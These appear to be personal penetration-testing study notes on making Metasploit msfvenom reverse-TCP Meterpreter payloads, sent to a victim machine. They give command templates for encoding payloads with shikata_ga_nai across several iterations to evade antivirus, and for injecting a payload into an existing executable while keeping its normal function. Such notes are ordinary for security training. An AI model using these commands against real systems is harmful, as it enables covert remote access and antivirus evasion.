Create listener via msfconsole
![](</Images/Pasted image 20231220191222.png>)

Difference between staged and non-staged is mainly file size. Staged is smaller.
### non-staged
>Formatted as `windows/x64/meterpreter_reverse_tcp`
#practice 
### staged
> Formatted as `windows/x64/meterpreter/reverse_tcp`

How to generate simple payload
`-a` specify architecture
`-p` specify payload
Attack machine info `LHOST` IP and `LPORT` port
`-f` file type `> payload name .<extension>`
`-f elf` for linux

Then transfer to victim machine
Lastly setup meterpreter session in msfconsole

### encoding payloads

to view different encoding methods:
`msfvenom --list enoders`

Good choice that works in both linux and windows
`shikata_ga_nai`

Usage:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack ip> LPORT=<port> -e <encoder> -f <file type to create> > <file name and location>
```

Increase iterations to help evade AV detection. Specify iterations with `-i <number>`

`-x` to inject executable into new file
`-k` to keep original functionality

Usage example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attack ip> LPORT=<port> -e <encoder> -f <file type to create> -x <executable to inject into> > <file name and location>
```

